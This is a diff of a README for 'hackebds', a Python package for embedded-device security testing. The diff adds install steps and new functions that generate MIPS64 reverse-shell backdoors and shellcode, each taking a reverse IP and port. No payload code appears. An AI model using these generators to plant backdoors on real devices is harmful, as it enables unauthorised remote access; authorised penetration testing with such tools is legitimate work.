@@ -15,9 +15,12 @@ This tool is embedded in the security test of the device. There are two main fun
 ## install (1)  Highly recommended！！Because the source code compilation may not be updated in time，Please install the latest
 **Since it has been updated to python3, please use it under python3**
 
-**pip install hackebds==0.0.7**
+**pip install hackebds==0.0.8**
+
 ```
-pip install hackebds==0.0.7
+apt search binutils | grep arm (The arm here can replace the corresponding architecture required)
+apt install binutils-arm-linux-gnueabi/hirsute
+pip install hackebds==0.0.8
 ....
 ```
 #### Instructions for use
@@ -33,6 +36,8 @@ When importing this module will import the pwn module
 >>> armelv7_backdoor(reverse_ip,reverse_port)
 >>> armebv5_backdoor(reverse_ip,reverse_port)
 >>> armebv7_backdoor(reverse_ip,reverse_port)
+>>> mips64_backdoor(reverse_ip,reverse_port)
+>>> mips64el_backdoor(reverse_ip,reverse_port)
 ```
 expample:
 ```
@@ -51,6 +56,8 @@ mipsel_backdoor is ok in current path ./
 >>> armelv7_reverse_sl(reverse_ip,reverse_port)
 >>> armebv5_reverse_sl(reverse_ip,reverse_port)
 >>> armebv7_backdoor(reverse_ip,reverse_port)
+>>> mips64_reverse_sl(reverse_ip,reverse_port)
+>>> mips64el_reverse_sl(reverse_ip,reverse_port)
 ```
 example:
 ```
@@ -126,6 +133,7 @@ Qualcomm Snapdragon 660
 ## updating
  2022.4.19 Added support for aarch64 null-byte reverse_shellcode
  2022.4.30 Reduced amount of code using functions and support python3
+ 2022.5.5 Solved the bug that mips_reverse_sl and mipsel_reverse_sl were not enabled, added mips64_backdoor, mips64_reverse_sl generation and mips64el_backdoor, mips64el_reverse_sl generation
 
 ## One-click build environment
 
